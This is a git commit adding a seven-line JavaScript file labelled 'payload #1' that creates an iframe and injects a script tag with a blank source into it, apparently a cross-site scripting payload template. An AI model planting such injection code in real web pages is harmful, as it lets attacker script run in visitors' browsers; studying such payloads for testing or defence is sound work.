a663c87c6fe37cfb2cc578a67aa83fe89d6ec47d
mister-gandalf <62494409+mister-gandalf@users.noreply.github.com>
2020-04-10 22:45:42 -0700

    Create fellowship.js

---
+++ fellowship.js
@@ -0,0 +1,7 @@
+//iframe creation - paylaod #1
+
+frame=document.createElement('iframe');
+document.body.appendChild(frame);
+script=document.createElement('script');
+script.src='_____';
+window.frames[0].document.head.appendChild(script)
